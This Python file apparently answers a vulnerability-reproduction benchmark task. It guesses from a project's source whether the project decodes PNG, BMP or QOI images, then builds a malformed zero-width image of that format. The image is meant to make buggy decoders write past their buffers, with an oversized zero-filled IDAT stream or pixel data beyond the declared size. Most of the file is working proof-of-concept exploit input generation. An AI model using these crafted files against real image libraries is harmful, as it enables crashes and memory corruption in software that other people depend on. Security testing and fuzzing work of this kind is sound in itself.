import os
import tarfile
import io
import struct
import zlib
from typing import Dict, List, Tuple


class Solution:
    def solve(self, src_path: str) -> bytes:
        fmt = self._detect_format(src_path)
        if fmt == 'bmp':
            return self._generate_bmp_rle_zero_width()
        if fmt == 'qoi':
            return self._generate_qoi_zero()
        # default to PNG
        return self._generate_png_zero_width()

    def _detect_format(self, src_path: str) -> str:
        scores = {k: 0 for k in ['png', 'bmp', 'qoi', 'gif', 'tga', 'webp', 'tiff', 'pnm']}
        name_bonus = {k: 0 for k in scores.keys()}
        patterns: Dict[str, List[bytes]] = {
            'png': [b'IHDR', b'IDAT', b'IEND', b'png_', b'libpng', b'png.h', b'png_struct', b'lodepng', b'spng', b'.png'],
            'bmp': [b'BITMAP', b'BITMAPINFOHEADER', b'BI_RGB', b'BMP', b'.bmp', b'bfType', b'RLE8', b'BITMAPFILEHEADER', b'biWidth'],
            'qoi': [b'qoif', b'qoi_', b'QOI', b'qoi.h', b'.qoi', b'qoi_decode', b'qoi_encode'],
            'gif': [b'GIF89a', b'GIF87a', b'gif', b'DGifOpen', b'EGif'],
            'tga': [b'tga', b'TARGA', b'.tga', b'TGAFooter', b'TGAHEADER'],
            'webp': [b'webp', b'VP8 ', b'VP8X', b'RIFF', b'WebP', b'libwebp', b'WebPAnimDecoder'],
            'tiff': [b'tiff', b'libtiff', b'TIFF', b'II*\x00', b'MM\x00*'],
            'pnm': [b'pnm', b'ppm', b'pgm', b'pbm', b'P6\n', b'P5\n', b'.ppm', b'.pgm', b'.pbm'],
        }
        # Bonus weights when project name suggests format
        name_hints: List[Tuple[str, str, int]] = [
            ('png', 'png', 20),
            ('bmp', 'bmp', 20),
            ('qoi', 'qoi', 30),
            ('gif', 'gif', 15),
            ('tga', 'tga', 15),
            ('webp', 'webp', 15),
            ('tiff', 'tiff', 15),
            ('ppm', 'pnm', 10),
            ('pgm', 'pnm', 10),
            ('pbm', 'pnm', 10),
            ('lodepng', 'png', 25),
            ('spng', 'png', 25),
            ('libpng', 'png', 25),
            ('SDL_image', 'bmp', 15),
            ('stb_image', 'png', 10),
            ('qoi', 'qoi', 30),
        ]

        def update_scores_from_name(name: str):
            lname = name.lower()
            for hint, key, w in name_hints:
                if hint in lname:
                    name_bonus[key] += w

        def scan_bytes(data: bytes):
            for key, pats in patterns.items():
                s = 0
                for p in pats:
                    s += data.count(p)
                scores[key] += s

        if os.path.isdir(src_path):
            update_scores_from_name(src_path)
            for root, _, files in os.walk(src_path):
                update_scores_from_name(root)
                for fn in files:
                    fpath = os.path.join(root, fn)
                    update_scores_from_name(fpath)
                    try:
                        if os.path.getsize(fpath) > 2_000_000:
                            continue
                        with open(fpath, 'rb') as f:
                            data = f.read()
                            scan_bytes(data)
                    except Exception:
                        continue
        else:
            try:
                if tarfile.is_tarfile(src_path):
                    with tarfile.open(src_path, 'r:*') as tf:
                        for m in tf.getmembers():
                            update_scores_from_name(m.name)
                            try:
                                if not m.isfile():
                                    continue
                                if m.size > 2_000_000:
                                    continue
                                f = tf.extractfile(m)
                                if f is None:
                                    continue
                                data = f.read()
                                scan_bytes(data)
                            except Exception:
                                continue
            except Exception:
                pass

        # Merge name bonuses
        for k in scores:
            scores[k] += name_bonus[k]

        # Prefer qoi > bmp > png in case of close scores where zero-dimension bugs are known
        order = ['qoi', 'bmp', 'png', 'gif', 'tga', 'webp', 'tiff', 'pnm']
        best = max(scores.items(), key=lambda kv: (kv[1], -order.index(kv[0])))[0]

        # Map to supported formats: if best is unsupported fallback
        if best in ('bmp', 'qoi', 'png'):
            return best
        # Heuristic fallback chain
        if scores['qoi'] >= max(scores['bmp'], scores['png']):
            return 'qoi'
        if scores['bmp'] >= scores['png']:
            return 'bmp'
        return 'png'

    def _generate_png_zero_width(self) -> bytes:
        # PNG with width=0, height=1; large IDAT to cause processing even if dimensions are zero
        def png_chunk(typ: bytes, data: bytes) -> bytes:
            length = struct.pack(">I", len(data))
            crc = zlib.crc32(typ)
            crc = zlib.crc32(data, crc) & 0xffffffff
            return length + typ + data + struct.pack(">I", crc)

        sig = b'\x89PNG\r\n\x1a\n'
        width = 0
        height = 1
        bit_depth = 8
        color_type = 6  # RGBA
        compression_method = 0
        filter_method = 0
        interlace_method = 0
        ihdr_data = struct.pack(">IIBBBBB",
                                width, height, bit_depth, color_type,
                                compression_method, filter_method, interlace_method)
        ihdr = png_chunk(b'IHDR', ihdr_data)

        # Create a large decompressed stream (zeros) to trigger writes despite zero width
        # Use high redundancy to keep compressed size small
        decompressed_size = 200000  # 200 KB of zeros -> small compressed
        idat_payload = zlib.compress(b'\x00' * decompressed_size, 9)
        idat = png_chunk(b'IDAT', idat_payload)

        iend = png_chunk(b'IEND', b'')
        return sig + ihdr + idat + iend

    def _generate_bmp_rle_zero_width(self) -> bytes:
        # 8-bit BMP with RLE8 compression, width=0, height=1. Pixel data encodes 3 pixels then EOF.
        bfType = b'BM'
        # Color palette of 256 entries (BGRA)
        palette = bytearray()
        for i in range(256):
            palette += bytes((i, i, i, 0))
        # RLE8 pixel data: [run-length=3][value=0], [EOBM]
        pixel_data = bytes([3, 0, 0, 1])  # 3 pixels of color 0, then end of bitmap
        biSize = 40
        biWidth = 0
        biHeight = 1
        biPlanes = 1
        biBitCount = 8
        BI_RLE8 = 1
        biCompression = BI_RLE8
        biSizeImage = len(pixel_data)
        biXPelsPerMeter = 2835
        biYPelsPerMeter = 2835
        biClrUsed = 256
        biClrImportant = 0

        dib = struct.pack('<IiiHHIIIIII',
                          biSize, biWidth, biHeight, biPlanes, biBitCount, biCompression,
                          biSizeImage, biXPelsPerMeter, biYPelsPerMeter, biClrUsed, biClrImportant)
        bfOffBits = 14 + len(dib) + len(palette)
        bfSize = bfOffBits + len(pixel_data)
        file_header = struct.pack('<2sIHHI', bfType, bfSize, 0, 0, bfOffBits)
        return file_header + dib + palette + pixel_data

    def _generate_qoi_zero(self) -> bytes:
        # QOI image with width=0, height=1; one RGB pixel then QOI end marker
        # QOI spec: magic 'qoif', BE width/height, 1 byte channels, 1 byte colorspace
        magic = b'qoif'
        width = 0
        height = 1
        channels = 3
        colorspace = 0
        header = magic + struct.pack('>IIBB', width, height, channels, colorspace)

        # QOI_OP_RGB: 0xFE R G B
        # This decodes one pixel even if w*h=0 in buggy decoders that don't bound by pixel count.
        pixel = bytes([0xFE, 0x12, 0x34, 0x56])

        # End marker: 7x 0x00 and 0x01
        end_marker = b'\x00' * 7 + b'\x01'
        return header + pixel + end_marker
